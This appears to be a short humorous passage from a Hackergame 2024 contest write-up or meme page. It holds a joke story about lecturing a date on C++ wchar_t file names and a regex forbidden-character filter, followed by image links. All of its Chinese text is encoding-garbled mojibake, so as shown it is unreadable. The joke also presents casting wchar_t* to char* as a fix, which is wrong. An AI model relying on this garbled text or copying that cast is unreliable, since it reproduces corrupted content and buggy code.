ç©åˆ°äº†æ™šä¸Šåï¼Œå¦¹å­é‚€è¯·ä½ ä¸€èµ·å»é¥­åº—å–é…’ã€‚å–åˆ°å¾®é†ºçš„æ—¶å€™ï¼Œå¦¹å­è¯´ï¼Œè¿™ä¹ˆæ™šäº†ç­‰ä¸‹å»æˆ‘å®¶å§ï¼Œä½ å¯ä»¥åšä½ ä»»ä½•æƒ³åšçš„äº‹æƒ…å–”ã€‚ä½ é—®ï¼ŒçœŸçš„å—ï¼Ÿé‚£æˆ‘å¤ªé«˜å…´äº†ã€‚äºæ˜¯ä½ ç»™å¦¹å­ç§‘æ™®ï¼Œä¸ºäº†è®© C++ ç¨‹åºæ›´åŠ  internationalï¼Œæœ€å¥½ä¸è¦ç”¨ `char` å­˜æ–‡ä»¶åï¼Œåº”è¯¥æ”¹ç”¨ `wchar_t`ï¼›ä½†æ˜¯æŸäº›ç‰ˆæœ¬çš„ç¼–è¯‘å™¨åŠå…¶è‡ªå¸¦çš„å¤´æ–‡ä»¶ä¸­ï¼Œæ–‡ä»¶åå¿…é¡»æ˜¯ `char` ç±»å‹çš„ - æ¬¸ğŸ¤“ğŸ‘†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ `(char*)` è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚

å¦¹å­ä¸€è„¸é»‘çº¿çš„çœ‹ç€ä½ ï¼Œå¿ƒä¸­ $\texttt{0x6874}$ åª `æ™¥æ…¬g` åœ¨å¥”è…¾ï¼Œä½ çœ‹ç€å¦¹å­çš„ `$input`ï¼Œå‘ç°å®ƒ `=~ [$FORBIDDEN_CHARS]`ï¼Œäºæ˜¯ä½ å›äº†å¥ï¼š

```text
Not Powerful Enough :)
```

### Hackergame ä¼ å¥‡.jpg

![Hackergame ä¼ å¥‡](/attachments/hg2024-legend.jpg)

### åœ£åœ°å·¡ç¤¼.jpg(s)

| åŒ»é™¢ | è½¦ç«™ |
| --- | --- |
| ![Hospital 1](/attachments/hg2024-hospital-1.jpg) | ![Station 1](/attachments/hg2024-station-2.jpg) |
| ![Hospital 2](/attachments/hg2024-hospital-2.jpg) | ![Station 2](/attachments/hg2024-station-1.jpg) |
